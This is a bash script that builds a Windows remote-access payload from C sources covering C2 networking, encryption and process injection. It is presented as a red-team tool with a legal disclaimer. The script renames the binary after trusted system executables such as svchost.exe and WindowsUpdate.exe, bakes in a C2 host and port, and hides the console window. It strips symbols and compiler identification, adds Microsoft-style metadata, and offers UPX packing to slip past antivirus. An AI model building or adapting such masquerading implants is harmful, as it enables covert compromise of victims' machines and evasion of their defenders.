#!/bin/bash
# Build Trusted-Looking Windows Payload
# For security research and penetration testing purposes only

set -e

echo "========================================"
echo "  TRUSTED WINDOWS PAYLOAD BUILDER"
echo "  Security Research & Red Team Edition"
echo "========================================"

SRC_DIR="/workspace/native_payloads"
BUILD_DIR="$SRC_DIR/build"
OUTPUT_DIR="$SRC_DIR/output"
RESOURCES_DIR="$SRC_DIR/windows"

# Configuration
LEGITIMATE_NAMES=(
    "WindowsUpdate.exe"
    "svchost.exe"
    "RuntimeBroker.exe"
    "SecurityHealthSystray.exe"
    "OneDrive.exe"
    "MicrosoftEdgeUpdate.exe"
    "GoogleUpdate.exe"
    "AdobeARM.exe"
    "OfficeClickToRun.exe"
)

# Choose random legitimate name or use provided
OUTPUT_NAME=${PAYLOAD_NAME:-${LEGITIMATE_NAMES[$RANDOM % ${#LEGITIMATE_NAMES[@]}]}}

echo "[*] Configuration:"
echo "    Output name: $OUTPUT_NAME"
echo "    C2 Host: ${C2_HOST:-127.0.0.1}"
echo "    C2 Port: ${C2_PORT:-4433}"
echo ""

# Clean and create directories
rm -rf $BUILD_DIR $OUTPUT_DIR
mkdir -p $BUILD_DIR $OUTPUT_DIR

# Compiler settings for Windows (using MinGW)
CC=${CC:-x86_64-w64-mingw32-gcc}
WINDRES=${WINDRES:-x86_64-w64-mingw32-windres}

# Optimization and obfuscation flags
CFLAGS="-O2 -Wall -Wextra"
CFLAGS="$CFLAGS -I$SRC_DIR/core -I$SRC_DIR/crypto -I$SRC_DIR/network -I$SRC_DIR/inject"
CFLAGS="$CFLAGS -DPLATFORM_WINDOWS"
CFLAGS="$CFLAGS -mwindows"  # GUI application (no console)
CFLAGS="$CFLAGS -fno-ident"  # Remove compiler identification
CFLAGS="$CFLAGS -fno-asynchronous-unwind-tables"  # Smaller binary
CFLAGS="$CFLAGS -ffunction-sections -fdata-sections"  # Better optimization

# C2 Configuration
if [ -n "$C2_HOST" ]; then
    CFLAGS="$CFLAGS -DSERVER_HOST=\"$C2_HOST\""
fi
if [ -n "$C2_PORT" ]; then
    CFLAGS="$CFLAGS -DSERVER_PORT=$C2_PORT"
fi

# Linker flags
LDFLAGS="-lws2_32 -lwininet -lcrypt32 -lpsapi -ladvapi32"
LDFLAGS="$LDFLAGS -Wl,--gc-sections"  # Remove unused sections
LDFLAGS="$LDFLAGS -Wl,--strip-all"  # Strip symbols
LDFLAGS="$LDFLAGS -Wl,--exclude-all-symbols"  # Remove export table
LDFLAGS="$LDFLAGS -s"  # Strip all symbols

# Source files
SOURCES="
    $SRC_DIR/core/main.c
    $SRC_DIR/core/utils.c
    $SRC_DIR/core/commands.c
    $SRC_DIR/crypto/aes.c
    $SRC_DIR/crypto/sha256.c
    $SRC_DIR/network/protocol.c
    $SRC_DIR/inject/inject_core.c
    $SRC_DIR/windows/winapi.c
    $SRC_DIR/inject/inject_windows.c
"

echo "[*] Step 1: Compiling resource file..."
if [ -f "$RESOURCES_DIR/resource.rc" ]; then
    $WINDRES $RESOURCES_DIR/resource.rc -o $BUILD_DIR/resource.o
    if [ $? -eq 0 ]; then
        echo "    ✓ Resource file compiled"
        RESOURCE_OBJ="$BUILD_DIR/resource.o"
    else
        echo "    ⚠ Resource compilation failed, continuing without"
        RESOURCE_OBJ=""
    fi
else
    echo "    ⚠ No resource file found, continuing without metadata"
    RESOURCE_OBJ=""
fi

echo "[*] Step 2: Compiling payload..."
if $CC $CFLAGS $SOURCES $RESOURCE_OBJ $LDFLAGS -o $BUILD_DIR/payload.exe 2>$BUILD_DIR/compile.log; then
    echo "    ✓ Compilation successful"
else
    echo "    ✗ Compilation failed! See $BUILD_DIR/compile.log"
    cat $BUILD_DIR/compile.log
    exit 1
fi

echo "[*] Step 3: Post-processing..."

# Strip all debug info and symbols
strip --strip-all --strip-debug --strip-unneeded $BUILD_DIR/payload.exe 2>/dev/null || true
echo "    ✓ Symbols stripped"

# Get original size
ORIGINAL_SIZE=$(stat -c%s "$BUILD_DIR/payload.exe" 2>/dev/null || stat -f%z "$BUILD_DIR/payload.exe" 2>/dev/null)

# Optional: UPX compression (can bypass some AV, but some detect UPX)
if command -v upx &> /dev/null && [ "${USE_UPX:-no}" = "yes" ]; then
    echo "[*] Step 4: UPX compression..."
    upx --best --lzma $BUILD_DIR/payload.exe 2>/dev/null || true
    COMPRESSED_SIZE=$(stat -c%s "$BUILD_DIR/payload.exe" 2>/dev/null || stat -f%z "$BUILD_DIR/payload.exe" 2>/dev/null)
    echo "    ✓ Compressed: $ORIGINAL_SIZE → $COMPRESSED_SIZE bytes"
fi

# Move to output with legitimate name
mv $BUILD_DIR/payload.exe $OUTPUT_DIR/$OUTPUT_NAME
echo "    ✓ Renamed to: $OUTPUT_NAME"

# Calculate hash
if command -v sha256sum &> /dev/null; then
    HASH=$(sha256sum $OUTPUT_DIR/$OUTPUT_NAME | cut -d' ' -f1)
    echo "    ✓ SHA256: $HASH"
fi

echo ""
echo "========================================"
echo "BUILD SUCCESSFUL!"
echo "========================================"
echo "Output: $OUTPUT_DIR/$OUTPUT_NAME"
echo "Size: $(stat -c%s "$OUTPUT_DIR/$OUTPUT_NAME" 2>/dev/null || stat -f%z "$OUTPUT_DIR/$OUTPUT_NAME" 2>/dev/null) bytes"
echo ""
echo "Features Applied:"
echo "  ✓ Legitimate file name"
echo "  ✓ Microsoft metadata/version info"
echo "  ✓ No console window (GUI app)"
echo "  ✓ Symbols stripped"
echo "  ✓ Compiler identification removed"
echo "  ✓ Windows manifest embedded"
if [ -n "$RESOURCE_OBJ" ]; then
    echo "  ✓ Resource file with version info"
fi
echo ""
echo "⚠️  LEGAL NOTICE:"
echo "This tool is for authorized security research,"
echo "penetration testing, and educational purposes ONLY."
echo "Unauthorized use is illegal."
echo "========================================"
